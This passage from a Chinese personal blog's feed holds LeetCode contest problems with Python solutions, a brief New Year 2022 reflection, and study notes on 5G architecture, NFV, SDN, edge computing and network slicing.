行和第 3 行上的设备之间不存在激光束。</span><br><span class="line">这是因为第 2 行存在安全设备，这不满足第 2 个条件。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;000&quot;,&quot;111&quot;,&quot;000&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在两个位于不同行的设备</span><br></pre></td></tr></table></figure><p>这道题的思路就是交叉相成，看成一个多行的数组，每一行的1的个数乘其他行1的个数。前提是两行之前能相乘的原则是中间行1的个数都为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numberOfBeams</span><span class="params">(self, bank)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type bank: List[str]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="comment">#统计每一行1的个数</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> bank:</span><br><span class="line">            res.append(list(line).count(<span class="string">'1'</span>))</span><br><span class="line">        <span class="comment">#设置保存光束的全局值</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(res)):</span><br><span class="line">                <span class="comment">#如果当前行都是0，则走到下一行</span></span><br><span class="line">                <span class="keyword">if</span> res[j] == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#如果当前行存在1，则直接计算光束值，后续的行就不需要计算，直接跳出循环</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans += res[i]*res[j]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h4 id="摧毁小行星"><a href="#摧毁小行星" class="headerlink" title="摧毁小行星"></a>摧毁小行星</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数 mass ，它表示一颗行星的初始质量。再给你一个整数数组 asteroids ，其中 asteroids[i] 是第 i 颗小行星的质量。</span><br><span class="line">你可以按 任意顺序 重新安排小行星的顺序，然后让行星跟它们发生碰撞。如果行星碰撞时的质量 大于等于 小行星的质量，那么小行星被 摧毁 ，并且行星会 获得 这颗小行星的质量。否则，行星将被摧毁。</span><br><span class="line">如果所有小行星 都 能被摧毁，请返回 true ，否则返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 10, asteroids = [3,9,19,5,21]</span><br><span class="line">输出：true</span><br><span class="line">解释：一种安排小行星的方式为 [9,19,5,3,21] ：</span><br><span class="line">- 行星与质量为 9 的小行星碰撞。新的行星质量为：10 + 9 = 19</span><br><span class="line">- 行星与质量为 19 的小行星碰撞。新的行星质量为：19 + 19 = 38</span><br><span class="line">- 行星与质量为 5 的小行星碰撞。新的行星质量为：38 + 5 = 43</span><br><span class="line">- 行星与质量为 3 的小行星碰撞。新的行星质量为：43 + 3 = 46</span><br><span class="line">- 行星与质量为 21 的小行星碰撞。新的行星质量为：46 + 21 = 67</span><br><span class="line">所有小行星都被摧毁。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 5, asteroids = [4,9,23,4]</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">行星无论如何没法获得足够质量去摧毁质量为 23 的小行星。</span><br><span class="line">行星把别的小行星摧毁后，质量为 5 + 4 + 9 + 4 = 22 。</span><br><span class="line">它比 23 小，所以无法摧毁最后一颗小行星。</span><br></pre></td></tr></table></figure><p>这道题我们使用贪心的做法，每次撞击行星的时候总是从最小的那个撞起。因此质量肯定可以累加。这里我们不用从最小的开始撞，从不超过mass值的最大值开始向后计算。因此我们首先需要对asteroids进行排序，找到初始mass应该插入的位置。如果插入位置为0的话，则证明初始mass的值不足以撞击任何行星，直接返回false即可。如果插入位置不为0，则依次向后判断，更新mass的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">asteroidsDestroyed</span><span class="params">(self, mass, asteroids)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type mass: int</span></span><br><span class="line"><span class="string">        :type asteroids: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#对行星大小排序</span></span><br><span class="line">        asteroids = sorted(asteroids)</span><br><span class="line">        <span class="comment">#找到mass在行星中的插入位置</span></span><br><span class="line">        insert = bisect.bisect(asteroids,mass)</span><br><span class="line">        <span class="comment">#如果插入位置是0，说明mass无法和任何行星碰撞，直接返回false</span></span><br><span class="line">        <span class="keyword">if</span> insert == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#如果插入位置不是0，则mass的最大质量是插入位置之前所有行星质量之和加上mass的初始质量</span></span><br><span class="line">        mass = sum(asteroids[:insert])+mass</span><br><span class="line">        <span class="comment">#从mass插入位置之后开始遍历，判断当前mass质量是否小于当前行星质量</span></span><br><span class="line">        <span class="comment">#如果小于直接返回false</span></span><br><span class="line">        <span class="comment">#如果大于则更新mass的质量</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(insert,len(asteroids)):</span><br><span class="line">            <span class="keyword">if</span> mass &lt; asteroids[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mass += asteroids[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="参加会议的最多员工数"><a href="#参加会议的最多员工数" class="headerlink" title="参加会议的最多员工数"></a>参加会议的最多员工数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个公司准备组织一场会议，邀请名单上有 n 位员工。公司准备了一张 圆形 的桌子，可以坐下 任意数目 的员工。</span><br><span class="line">员工编号为 0 到 n - 1 。每位员工都有一位 喜欢 的员工，每位员工 当且仅当 他被安排在喜欢员工的旁边，他才会参加会议。每位员工喜欢的员工 不会 是他自己。</span><br><span class="line">给你一个下标从 0 开始的整数数组 favorite ，其中 favorite[i] 表示第 i 位员工喜欢的员工。请你返回参加会议的 最多员工数目 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [2,2,1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司邀请员工 0，1 和 2 参加会议以及他们在圆桌上的座位。</span><br><span class="line">没办法邀请所有员工参与会议，因为员工 2 没办法同时坐在 0，1 和 3 员工的旁边。</span><br><span class="line">注意，公司也可以邀请员工 1，2 和 3 参加会议。</span><br><span class="line">所以最多参加会议的员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [1,2,0]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">每个员工都至少是另一个员工喜欢的员工。所以公司邀请他们所有人参加会议的前提是所有人都参加了会议。</span><br><span class="line">座位安排同图 1 所示：</span><br><span class="line">- 员工 0 坐在员工 2 和 1 之间。</span><br><span class="line">- 员工 1 坐在员工 0 和 2 之间。</span><br><span class="line">- 员工 2 坐在员工 1 和 0 之间。</span><br><span class="line">参与会议的最多员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [3,0,1,4,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司可以邀请员工 0，1，3 和 4 参加会议以及他们在圆桌上的座位。</span><br><span class="line">员工 2 无法参加，因为他喜欢的员工 0 旁边的座位已经被占领了。</span><br><span class="line">所以公司只能不邀请员工 2 。</span><br><span class="line">参加会议的最多员工数目为 4 。</span><br></pre></td></tr></table></figure><p>一脸懵逼，等一手题解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;老三样如约而至。。。。&lt;/p&gt;
&lt;h4 id=&quot;检查是否所有-A-都在-B-之前&quot;&gt;&lt;a href=&quot;#检查是否所有-A-都在-B-之前&quot; 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>辞旧迎新</title>
    <link href="elssm.github.io/2022/01/01/%E8%BE%9E%E6%97%A7%E8%BF%8E%E6%96%B0/"/>
    <id>elssm.github.io/2022/01/01/辞旧迎新/</id>
    <published>2022-01-01T03:35:26.000Z</published>
    <updated>2022-01-19T14:57:21.777Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>2022年第一天。。。</p><p>万万没想到今年跨年我也是在昆明度过。</p><p>如果不是因为疫情的话，此时的我应该在西安。</p><h4 id="回想"><a href="#回想" class="headerlink" title="回想"></a>回想</h4><p>回想2021年，匆匆忙忙度过。</p><p>读了一些书，去了一些地方，认识了一些人，学了一些东西。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>新的一年。</p><p>希望家人朋友身体健康！</p><p>希望秋招有一个好的结果！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;2022年第一天。。。&lt;/p&gt;
&lt;p&gt;万万没想到今年跨年我也是在昆明度过。&lt;/p&gt;
&lt;p&gt;如果不是因为疫情的话，此时的我应该在西安。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="随想" scheme="elssm.github.io/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>5G基础学习</title>
    <link href="elssm.github.io/2021/12/31/5G%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/31/5G基础学习/</id>
    <published>2021-12-31T02:58:21.000Z</published>
    <updated>2022-01-04T07:39:38.754Z</updated>
    
    <content type="html"><![CDATA[<h4 id="5G介绍"><a href="#5G介绍" class="headerlink" title="5G介绍"></a>5G介绍</h4><p>5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所使用的技术、发送与接收信号之间的时间间隔（延迟），以及通过网络向所连设备传输数据的速度。5G 网络有望实现千兆级的速度。同时，5G 服务还大大缩短了延迟，并可将覆盖范围扩展到偏远地区。 </p><p><a href="https://www.keysight.com/cn/zh/assets/7018-06171/brochures/5992-2996.pdf" target="_blank" rel="noopener">5G常用属于及缩略语</a></p><h4 id="5G应用场景"><a href="#5G应用场景" class="headerlink" title="5G应用场景"></a>5G应用场景</h4><h5 id="eMBB"><a href="#eMBB" class="headerlink" title="eMBB"></a>eMBB</h5><p>“增强移动宽带”。就是以人为中心的应用场景，集中表现为超高的传输数据速率，广覆盖下的移动性保证等，这是最直观改善移动网速，未来更多的应用对移动网速的需求都将得到满足，从 eMBB 层面上来说， 它是原来移动网络的升级，让人们体验到极致的网速。因此，增强移动宽带（eMBB）将是 5G 发展初期面向个人消费市场的核心应用场景。</p><h5 id="uRLLC"><a href="#uRLLC" class="headerlink" title="uRLLC"></a>uRLLC</h5><p>“高可靠低时延连接”。在此场景下，连接时延要达到 1ms 级别，而且要支持高速移动（500KM/H）情况下的高可靠性（99.999%）连接。这一场景更多面向车联网、工业控制、远程医疗等特殊应用，这类应用在未来潜在的价值极高，未来社会走向智能化，就得依靠这个场景得网络，这些应用的安全性、可靠性要求极高。</p><h5 id="mMTC"><a href="#mMTC" class="headerlink" title="mMTC"></a>mMTC</h5><p>“大规模机器类型通信”，5G 强大的连接能力可以快速促进各垂直行业（智慧城市、智能家居、环境监测等）的深度融合。万物互联下，人们的生活方式也将发生颠覆性的变化。这一场景下，数据速率较低且时延不敏感，连接覆盖生活的方方面面，终端成本更低，电池寿命更长且可靠性更高，真正能实现万物互联。</p><p>如下图所示为5G不同应用场景的需求指标差异</p><p><img src="/2021/12/31/5G基础学习/1.png" alt="1"></p><h4 id="5G网络架构"><a href="#5G网络架构" class="headerlink" title="5G网络架构"></a>5G网络架构</h4><p>针对于上述的三大应用场景，单一的网络很难满足三种网络需求，因此我们可以设置三种网络分别是<code>5G-eMBB</code>网络、<code>5G-uRLLC</code>网络、<code>5G-mMTC</code>网络。这是一种解决办法，但是这样做的成本太高，非常不划算。因此这也成为了5G时代的一种挑战。</p><p><img src="/2021/12/31/5G基础学习/2.png" alt="2"></p><h5 id="基于服务的架构SBA"><a href="#基于服务的架构SBA" class="headerlink" title="基于服务的架构SBA"></a>基于服务的架构SBA</h5><p><img src="/2021/12/31/5G基础学习/3.png" alt="3"></p><p>AMF(Access and Mobility Management Function)：接入和移动性管理功能，类似于4G的MME</p><ul><li>终止RAN CP接口(N2)</li><li>终止NAS(N1)，NAS加密和完整性保护</li><li>注册、连接、可达性和流动性管理</li><li>合法拦截</li><li>为UE和SMF之间的SM消息提供传输</li><li>用于路由SM消息的透明代理</li><li>接入身份验证和接入授权</li></ul><p>SMF(The Session Management Function)：会话管理功能，类似于4G的PGW</p><ul><li>负责与分离的数据面交互，创建、更新和删除PDU会话</li><li>管理与UPF的会话环境</li><li>负责DHCP服务器和IP地址管理系统的功能</li></ul><p>UPF(The User plane Function)：用户面功能</p><ul><li>终端和外部数据的传输</li><li>数据包的路由转发</li><li>应用数据传输的策略</li><li>处理QOS相关功能</li></ul><p>PCF(The Policy Control Function)：策略控制功能</p><ul><li>给整个网络提供配置</li><li>通过访问用户数据库转发策略信息</li></ul><p>NEF(The Network Exposure Function)：网络开放功能</p><ul><li>给外部用户提供一些特定的服务</li></ul><p>NRF(The Network Repository Function)：网络存储库功能</p><ul><li>支持服务发现</li></ul><p>UDM(The Unified Data Management)：统一数据管理</p><ul><li>生成鉴权信息</li></ul><p>AUSF(The Authentication Server Function)：鉴权服务功能</p><ul><li>提供鉴权和接入</li></ul><p>AF(The Application Function)：应用功能</p><ul><li>提供上层的应用功能</li></ul><p>UDR(The Unified Data Repository)：统一数据存储库</p><ul><li>通过UDM来提取存储签约数据</li><li>通过PCF提取存储策略数据</li><li>存储一些结构化的数据</li></ul><p>UDFS(The Unstructured Data Storage Function)：非结构化数据存储功能</p><ul><li>存储一些非结构化的数据</li></ul><p>SMSF(The Short Message Service Function)：短消息服务功能</p><ul><li>短信管理，签约信息管理</li></ul><p>NSSF(The Network Slice Selection function)：网络切片选择功能</p><ul><li>根据UE提供的信息管理特定的网络切片</li></ul><p>5G-EIR(The 5G-Equipment Identity Register)：5G设备认证中心</p><ul><li>检查设备状态</li></ul><p>LMF(The Location Management Function)：位置管理功能</p><ul><li>支持定位相关功能的管理</li></ul><p>SEPP(The Security Edge Protection Proxy)：安全边缘保护代理</p><ul><li>规则定义，数据包过滤</li></ul><p>NWDAF(The Network Data Analytics Function)：网络数据分析功能</p><ul><li>提供基于网络切片的网络数据分析</li></ul><h5 id="网络功能服务框架"><a href="#网络功能服务框架" class="headerlink" title="网络功能服务框架"></a>网络功能服务框架</h5><h5 id="交互机制"><a href="#交互机制" class="headerlink" title="交互机制"></a>交互机制</h5><p>服务使用者和服务提供者之间的交互基于两种机制，分别是</p><ul><li>请求响应机制</li><li>订阅通知机制</li></ul><p><img src="/2021/12/31/5G基础学习/4.png" alt="4"></p><h5 id="注册、发现、授权机制"><a href="#注册、发现、授权机制" class="headerlink" title="注册、发现、授权机制"></a>注册、发现、授权机制</h5><p>服务提供者在上线之后会进行注册，注册通过发送消息给NRF。注册之后，NRF中会存储现在的一个状态服务信息，后续假如有其他服务的使用者想使用这个服务。如下图所示，PCF想使用AMF服务的功能，那么PCF首先会给NRF发送一个服务发现消息。查询NRF中是否存有AMF服务信息，如果有的话，NRF会对PCF进行鉴权，之后PCF会获得AMF的相关服务信息，之后就可以使用请求响应机制来获取AMF相关的服务。</p><p><img src="/2021/12/31/5G基础学习/5.png" alt="5"></p><h5 id="SBI接口协议"><a href="#SBI接口协议" class="headerlink" title="SBI接口协议"></a>SBI接口协议</h5><p><img src="/2021/12/31/5G基础学习/6.png" alt="6"></p><h5 id="5G核心网与EPC交互"><a href="#5G核心网与EPC交互" class="headerlink" title="5G核心网与EPC交互"></a>5G核心网与EPC交互</h5><p><img src="/2021/12/31/5G基础学习/7.png" alt="7"></p><h5 id="5G接入网架构"><a href="#5G接入网架构" class="headerlink" title="5G接入网架构"></a>5G接入网架构</h5><p><img src="/2021/12/31/5G基础学习/8.png" alt="8"></p><h5 id="5G和4G接入网对比"><a href="#5G和4G接入网对比" class="headerlink" title="5G和4G接入网对比"></a>5G和4G接入网对比</h5><p><img src="/2021/12/31/5G基础学习/9.png" alt="9"></p><h5 id="5G接入网CU-DU"><a href="#5G接入网CU-DU" class="headerlink" title="5G接入网CU/DU"></a>5G接入网CU/DU</h5><p><img src="/2021/12/31/5G基础学习/10.png" alt="10"></p><p>可以看到，在CU中又划分为用户面和控制面，之间通过E1接口来连接。从而形成了控制面<code>CU-CP</code>和用户面<code>CU-UP</code>。分离的好处一是可以进行集中化的控制，二是可以灵活的部署。</p><p>这里需要注意的是，一个DU只能连接到一个<code>CU-CP</code>，一个<code>CU-UP</code>也只能连接到一个<code>CU-CP</code>，一个DU可以连接到一个<code>CU-CP</code>控制下的多个<code>CU-UP</code>，一个<code>CU-UP</code>可以连接到一个<code>CU-CP</code>控制下的多个DU。</p><h5 id="5G网络部署选项"><a href="#5G网络部署选项" class="headerlink" title="5G网络部署选项"></a>5G网络部署选项</h5><p><img src="/2021/12/31/5G基础学习/11.png" alt="11"></p><p><img src="/2021/12/31/5G基础学习/12.png" alt="12"></p><p><img src="/2021/12/31/5G基础学习/13.png" alt="13"></p><h4 id="5G关键技术"><a href="#5G关键技术" class="headerlink" title="5G关键技术"></a>5G关键技术</h4><p><img src="/2021/12/31/5G基础学习/14.png" alt="14"></p><h5 id="NFV-网络功能虚拟化"><a href="#NFV-网络功能虚拟化" class="headerlink" title="NFV(网络功能虚拟化)"></a>NFV(网络功能虚拟化)</h5><p>NFV技术是一种将网络功能整合到行业标准的服务器、交换机和存储硬件上，并且提供优化的虚拟化数据平面，可通过服务器上运行的软件让管理员取代传统物理网络设备的技术。</p><p>NFV实现了软硬件的解耦，如下图所示</p><p><img src="/2021/12/31/5G基础学习/15.png" alt="15"></p><h6 id="NFV的好处"><a href="#NFV的好处" class="headerlink" title="NFV的好处"></a>NFV的好处</h6><ul><li>成本低</li><li>灵活性高</li><li>部署快</li><li>开放性高</li><li>配置简单</li></ul><h6 id="NFV架构"><a href="#NFV架构" class="headerlink" title="NFV架构"></a>NFV架构</h6><p><img src="/2021/12/31/5G基础学习/16.png" alt="16"></p><ul><li>VNF(Virtualized Network Function)：虚拟化的网络功能</li><li>EM(Element Management)：网元管理功能</li><li>Hardware Resources：硬件资源</li><li>Virtualisation Layer and Virtualised Resources：虚拟化层及虚拟资源</li><li>VIM(Virtualised infrastructure Managers)：虚拟化基础设施管理器</li><li>VNFM(VNF Managers)：虚拟化网络功能管理器</li><li>NFVO(NFV Orchestrator)：网络功能虚拟化编排器</li></ul><h6 id="NFV集成方式"><a href="#NFV集成方式" class="headerlink" title="NFV集成方式"></a>NFV集成方式</h6><p><img src="/2021/12/31/5G基础学习/17.png" alt="17"></p><p>NFV带来的挑战</p><p><img src="/2021/12/31/5G基础学习/18.png" alt="18"></p><h5 id="SDN-软件定义网络"><a href="#SDN-软件定义网络" class="headerlink" title="SDN(软件定义网络)"></a>SDN(软件定义网络)</h5><p>SDN的设计思路其实和NFV一样，都是通过解耦来实现系统灵活性的提升。NFV是软硬件解耦，而SDN是控制平面和转发平面解耦。传统网络中，各个转发节点（例如路由器、交换机）都是独立工作的，内部管理命令和接口也是厂商私有的，不对外开放。而SDN网络，就是在网络之上建立了一个SDN控制器节点，统一管理和控制下层设备的数据转发。所有的下级节点，管理功能被剥离（交给了SDN控制器），只剩下转发功能。如下图对比所示</p><p><img src="/2021/12/31/5G基础学习/19.png" alt="19"></p><h6 id="SDN架构"><a href="#SDN架构" class="headerlink" title="SDN架构"></a>SDN架构</h6><p><img src="/2021/12/31/5G基础学习/20.png" alt="20"></p><p>最底层是基础设施层，专注于数据和业务转发。中间层是控制层，集中管理网络设备，将整个网络虚拟化成一种资源池，根据用户需求灵活分配资源。最上层是应用层，可以根据各种API接口对底层设备进行编程，从而开发各种业务应用。</p><h6 id="SDN应用场景"><a href="#SDN应用场景" class="headerlink" title="SDN应用场景"></a>SDN应用场景</h6><p>核心网SDN化</p><ul><li>提升转发性能</li><li>提升网络可靠性</li><li>促进网络扁平化部署</li><li>提升业务创新能力</li></ul><h5 id="SDN与NFV的关系"><a href="#SDN与NFV的关系" class="headerlink" title="SDN与NFV的关系"></a>SDN与NFV的关系</h5><p><img src="/2021/12/31/5G基础学习/21.png" alt="21"></p><h5 id="MEC-移动边缘计算"><a href="#MEC-移动边缘计算" class="headerlink" title="MEC(移动边缘计算)"></a>MEC(移动边缘计算)</h5><p>MEC的基本思想是把云计算平台从移动核心网络内部迁移到移动接入网边缘，通过部署具备计算、存 储、通信等功能的边缘节点，使传统无线接入网具备业务本地化条件，进一步为终端用户提供更高带宽、更低时延的数据服务，并大幅度减少核心网的网络负荷，同时降低数据业务对网络回传的带宽要求。</p><h6 id="MEC实现方式"><a href="#MEC实现方式" class="headerlink" title="MEC实现方式"></a>MEC实现方式</h6><p><img src="/2021/12/31/5G基础学习/22.png" alt="22"></p><p>传统的网络应用终端要通过核心网去连接，从终端到核心网到基站再到应用。引入边缘计算是通过在靠近接入网的位置加入MEC功能。其中MEC中包括接入网的CU，UPF和边缘计算的APP。因此我们可以通过边缘计算访问到我们需要的APP，可以提高用户的访问速度。因为5G采用的是SBA架构，将用户面和控制面彻底分离，因此用户面的功能完全是由UPF控制的，所以UPF可以和接入网一起部署在靠近用户的无线接入网的地方，配合MEC独立使用。</p><h6 id="MEC架构"><a href="#MEC架构" class="headerlink" title="MEC架构"></a>MEC架构</h6><p><img src="/2021/12/31/5G基础学习/23.png" alt="23"></p><h6 id="MEC部署方式"><a href="#MEC部署方式" class="headerlink" title="MEC部署方式"></a>MEC部署方式</h6><p><img src="/2021/12/31/5G基础学习/24.png" alt="24"></p><h6 id="MEC应用场景"><a href="#MEC应用场景" class="headerlink" title="MEC应用场景"></a>MEC应用场景</h6><ul><li>本地分流<ul><li>企业园区</li><li>校园</li><li>本地视频监控</li><li>VR/AR</li><li>本地视频直播</li><li>边缘CDN</li></ul></li><li>数据服务<ul><li>室内定位</li><li>车联网</li></ul></li><li>业务优化<ul><li>视频QoS优化</li><li>视频直播和游戏加速</li></ul></li></ul><h5 id="NS-网络切片"><a href="#NS-网络切片" class="headerlink" title="NS(网络切片)"></a>NS(网络切片)</h5><p>一个5G网络切片是一组网络功能，运行这些网络功能的资源以及这些网络功能特定的配置所组成的集合，这些网络功能及其相应的配置形成一个完整的逻辑网络，这个逻辑网络包含满足特定业务所需要的网络特征，为此特定的业务场景提供相应的网络服务。</p><p>网络切片的优势</p><p>网络切片允许共享同一基础设施的运营者为切片配置网络以及定义具体功能，并且可以根据运营者的策略通过SDN、NFV灵活地动态创造以及撤销切片。这样可以灵活地管理网络资源，通过只提供必要的网络资源以满足服务需求来极大的提高网络资源的利用率。</p><h6 id="端到端网络切片的实现"><a href="#端到端网络切片的实现" class="headerlink" title="端到端网络切片的实现"></a>端到端网络切片的实现</h6><p><img src="/2021/12/31/5G基础学习/25.png" alt="25"></p><h6 id="核心网切片"><a href="#核心网切片" class="headerlink" title="核心网切片"></a>核心网切片</h6><p><img src="/2021/12/31/5G基础学习/26.png" alt="26"></p><p><img src="/2021/12/31/5G基础学习/27.png" alt="27"></p><p><img src="/2021/12/31/5G基础学习/28.png" alt="28"></p><h6 id="核心网切片选择"><a href="#核心网切片选择" class="headerlink" title="核心网切片选择"></a>核心网切片选择</h6><p><img src="/2021/12/31/5G基础学习/29.png" alt="29"></p><h6 id="传输网切片"><a href="#传输网切片" class="headerlink" title="传输网切片"></a>传输网切片</h6><p><img src="/2021/12/31/5G基础学习/30.png" alt="30"></p><h6 id="接入网切片"><a href="#接入网切片" class="headerlink" title="接入网切片"></a>接入网切片</h6><p><img src="/2021/12/31/5G基础学习/31.png" alt="31"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;5G介绍&quot;&gt;&lt;a href=&quot;#5G介绍&quot; class=&quot;headerlink&quot; title=&quot;5G介绍&quot;&gt;&lt;/a&gt;5G介绍&lt;/h4&gt;&lt;p&gt;5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
</feed>
